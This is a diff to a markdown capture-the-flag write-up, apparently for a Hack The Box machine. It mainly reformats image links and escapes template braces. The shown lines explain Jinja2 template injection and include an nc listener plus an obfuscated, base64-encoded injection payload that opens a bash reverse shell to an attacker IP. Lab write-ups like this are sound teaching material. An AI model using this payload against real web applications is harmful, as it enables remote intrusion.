@@ -103,12 +103,12 @@ Add to host file:
 ![[Assets/aimage/Pasted image 20250906192511.png]]
 
 Login with creds and then we have SSTI:
-Payload: {{7+7}} or *
-![[Assets/aimage/Pasted image 20250906194032.png]]
+Payload: {% raw %}{{7+7}}{% endraw %} or *
+![SSTI 1](/assets/img/htb-writeups/Pasted image 20250906194032.png)
 
-![[Assets/aimage/Pasted image 20250906194642.png]]
+![SSTI 2](/assets/img/htb-writeups/Pasted image 20250906194642.png)
 
-- Injection into a **Jinja2 template** (`{{ ... }}` syntax).
+- Injection into a **Jinja2 template** (`{% raw %}{{ ... }}{% endraw %}` syntax).
 - You abuse Python object access (`config.__class__.__init__.__globals__`) to reach the `os` module.
 - Then use `os.popen()` to execute a **reverse shell command**.
   
@@ -123,8 +123,7 @@ nc -nvlp 4444
 
 Then we construct  SSTI payload to deliver on site through the name field.
 ```
-{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zLzQ0NDQgMD4mMQ===${IFS}|base64${IFS}-d|bash').read()}}
-
+{% raw %}{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zLzQ0NDQgMD4mMQ===${IFS}|base64${IFS}-d|bash').read()}}{% endraw %}
 ```
 
 #### Privilege Escalation via Docker Escape
